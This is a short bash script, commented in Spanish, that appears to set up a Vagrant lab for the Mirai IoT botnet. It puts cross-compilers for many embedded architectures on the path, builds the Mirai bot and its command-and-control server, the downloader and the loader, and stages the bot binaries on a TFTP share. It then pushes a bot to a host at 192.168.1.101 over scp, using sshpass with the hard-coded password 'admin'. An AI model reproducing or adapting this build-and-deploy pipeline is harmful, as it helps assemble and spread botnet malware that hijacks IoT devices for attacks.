#!/usr/bin/env bash


echo ">>> Recompilando... Cerrando proceso CNC... "
killall cnc || true
export PATH=$PATH:/etc/xcompile/cross-compiler-armv4l/bin
export PATH=$PATH:/etc/xcompile/cross-compiler-armv6l/bin
export PATH=$PATH:/etc/xcompile/cross-compiler-i586/bin
export PATH=$PATH:/etc/xcompile/cross-compiler-m68k/bin
export PATH=$PATH:/etc/xcompile/cross-compiler-mips/bin
export PATH=$PATH:/etc/xcompile/cross-compiler-mipsel/bin
export PATH=$PATH:/etc/xcompile/cross-compiler-powerpc/bin
export PATH=$PATH:/etc/xcompile/cross-compiler-powerpc-440fp/bin
export PATH=$PATH:/etc/xcompile/cross-compiler-sh4/bin
export PATH=$PATH:/etc/xcompile/cross-compiler-sparc/bin
export PATH=$PATH:/etc/xcompile/cross-compiler-armv6l/bin
 
export PATH=$PATH:/usr/local/go/bin

go get github.com/go-sql-driver/mysql
go get github.com/mattn/go-shellwords

sudo dnsmasq

echo ">>> Building mirai bot and cnc..."
cd /vagrant/mirai/
./build.sh debug telnet

killall inetd || true
killall cnc || true
duende /vagrant/mirai/debug/cnc
cp /vagrant/mirai/debug/mirai* /vagrant/tftp/

echo ">>> Building dlr..."
cd /vagrant/mirai/dlr
./build.sh
cp /vagrant/mirai/dlr/release/* /vagrant/mirai/loader/bins/

echo ">>> Building loader..."
cd /vagrant/mirai/loader
./build.debug.sh

echo ">>> Terminado, EJECUTA start.bat para volver a iniciar"


sudo apt install sshpass -y
sshpass -p "admin" scp /vagrant/mirai/debug/mirai.dbg admin@192.168.1.101:/home/admin/


echo ">>>Ejecutable enviado al bot_1. Terminado "